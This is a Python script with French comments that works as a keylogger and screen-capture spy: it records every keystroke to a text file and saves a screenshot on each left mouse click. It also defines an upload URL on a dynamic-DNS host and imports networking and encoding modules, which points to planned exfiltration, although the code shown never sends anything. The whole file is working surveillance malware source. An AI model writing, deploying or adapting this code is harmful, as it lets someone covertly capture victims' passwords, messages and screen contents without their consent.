import win32api
import win32con
import time
from PIL import ImageGrab
import os
from datetime import datetime
from pynput import keyboard
import requests
import json
from datetime import datetime
import base64

SERVER_URL = "http://br0nson.ddns.net:5000/upload"

def get_mouse_click_positions():
    # Créer le dossier 'captures' s'il n'existe pas
    if not os.path.exists('captures'):
        os.makedirs('captures')

    try:
        while True:
            # Vérifie l'état des boutons de la souris
            state_left = win32api.GetKeyState(win32con.VK_LBUTTON)
            state_right = win32api.GetKeyState(win32con.VK_RBUTTON)
            state_middle = win32api.GetKeyState(win32con.VK_MBUTTON)

            if state_left < 0:
                x, y = win32api.GetCursorPos()
                print('\nClic gauche en position ({}, {})'.format(x, y))

                # Prendre une capture d'écran
                screenshot = ImageGrab.grab()

                # Créer un nom de fichier unique basé sur le timestamp
                timestamp = datetime.now().strftime('%Y%m%d_%H%M%S_%f')
                filename = f'screenshot_{timestamp}.png'

                # Chemin complet du fichier dans le dossier 'captures'
                filepath = os.path.join('captures', filename)

                # Enregistrer la capture d'écran
                screenshot.save(filepath)
                print(f'Capture d\'écran enregistrée sous {filepath}')

                # Attend que le bouton soit relâché
                while win32api.GetKeyState(win32con.VK_LBUTTON) < 0:
                    time.sleep(0.01)

            if state_right < 0:
                x, y = win32api.GetCursorPos()
                print('\nClic droit en position ({}, {})'.format(x, y))
                # Vous pouvez également prendre une capture d'écran ici si vous le souhaitez

                while win32api.GetKeyState(win32con.VK_RBUTTON) < 0:
                    time.sleep(0.01)

            if state_middle < 0:
                x, y = win32api.GetCursorPos()
                print('\nClic milieu en position ({}, {})'.format(x, y))
                # Vous pouvez également prendre une capture d'écran ici si vous le souhaitez

                while win32api.GetKeyState(win32con.VK_MBUTTON) < 0:
                    time.sleep(0.01)

            time.sleep(0.01)
    except KeyboardInterrupt:
        print("\nProgramme arrêté.")

def keyPressed(key):
    with open("keyfile.txt", 'a') as logKey:
        try:
            char = key.char  # Essaie d'obtenir le caractère
            print(char, end='', flush=True)
            logKey.write(char)
        except AttributeError:
            # Gère les touches spéciales
            if key == keyboard.Key.space:
                print(' ', end='', flush=True)
                logKey.write(' ')
            elif key == keyboard.Key.enter:
                print('\n', end='', flush=True)
                logKey.write('\n')
            else:
                # Vous pouvez ajouter d'autres touches spéciales si nécessaire
                pass

if __name__ == "__main__":
    # Démarrer le listener du clavier
    listener = keyboard.Listener(on_press=keyPressed)
    listener.start()

    # Démarrer la capture des clics de souris
    get_mouse_click_positions()
